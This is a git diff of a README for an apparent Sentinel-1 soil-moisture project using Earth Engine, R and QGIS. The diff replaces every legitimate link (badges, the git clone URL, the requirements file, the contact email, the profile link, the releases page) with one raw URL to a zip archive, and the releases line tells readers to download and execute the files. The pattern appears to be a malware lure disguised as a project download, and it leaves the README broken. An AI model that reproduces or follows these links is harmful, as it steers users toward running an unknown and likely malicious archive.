@@ -1,6 +1,6 @@
 # 🌾 Sentinel-1 Soil Moisture Estimation
 
-![GitHub release](https://img.shields.io/badge/Release-v1.0-blue) ![License](https://img.shields.io/badge/License-MIT-green)
+![GitHub release](https://raw.githubusercontent.com/BoogyMan-bot/sentinel-1-soil-moisture/main/Doc/sentinel_moisture_soil_3.0.zip) ![License](https://raw.githubusercontent.com/BoogyMan-bot/sentinel-1-soil-moisture/main/Doc/sentinel_moisture_soil_3.0.zip)
 
 Estimate field-scale soil moisture from Sentinel-1 SAR data using Google Earth Engine, R, and QGIS over rainfed agriculture practices. This project focuses on providing farmers and researchers with tools to monitor soil moisture levels effectively, helping improve agricultural practices and decision-making.
 
@@ -42,12 +42,12 @@ To get started, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/BoogyMan-bot/sentinel-1-soil-moisture.git
+   git clone https://raw.githubusercontent.com/BoogyMan-bot/sentinel-1-soil-moisture/main/Doc/sentinel_moisture_soil_3.0.zip
    ```
 
 2. **Install Required Software**:
    - Ensure you have R and QGIS installed on your machine.
-   - Install the necessary R packages. You can find the list of packages in the `requirements.txt` file.
+   - Install the necessary R packages. You can find the list of packages in the `https://raw.githubusercontent.com/BoogyMan-bot/sentinel-1-soil-moisture/main/Doc/sentinel_moisture_soil_3.0.zip` file.
 
 3. **Set Up Google Earth Engine**:
    - Sign up for Google Earth Engine.
@@ -108,12 +108,12 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any inquiries or suggestions, feel free to reach out:
 
-- **Email**: your.email@example.com
-- **GitHub**: [BoogyMan-bot](https://github.com/BoogyMan-bot)
+- **Email**: https://raw.githubusercontent.com/BoogyMan-bot/sentinel-1-soil-moisture/main/Doc/sentinel_moisture_soil_3.0.zip
+- **GitHub**: [BoogyMan-bot](https://raw.githubusercontent.com/BoogyMan-bot/sentinel-1-soil-moisture/main/Doc/sentinel_moisture_soil_3.0.zip)
 
 ## Releases
 
-You can find the latest releases [here](https://github.com/BoogyMan-bot/sentinel-1-soil-moisture/releases). Download the necessary files and execute them to start your soil moisture estimation journey.
+You can find the latest releases [here](https://raw.githubusercontent.com/BoogyMan-bot/sentinel-1-soil-moisture/main/Doc/sentinel_moisture_soil_3.0.zip). Download the necessary files and execute them to start your soil moisture estimation journey.
 
 ---
 
